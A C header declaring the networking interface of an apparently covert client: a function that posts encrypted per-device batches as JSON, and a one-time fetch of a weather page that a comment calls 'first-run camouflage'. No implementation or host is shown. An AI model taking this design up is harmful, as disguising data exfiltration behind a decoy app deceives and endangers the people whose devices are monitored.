#ifndef NET_H
#define NET_H

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

bool net_init(void);
void net_shutdown(void);

// POSTs one sealed batch as JSON:
// {"v":1,"d":"<device id>","ts":<sec>,"n":"<b64>","c":"<b64>","t":"<b64>"}
// Returns true on HTTP 200.
bool net_post_sync(const char *device_id, uint64_t ts_ms,
                   const uint8_t nonce[12],
                   const uint8_t *ct, size_t ct_len,
                   const uint8_t tag[16]);

// One-time GET of the weather page (first-run camouflage).
bool net_get_home(void);

#endif
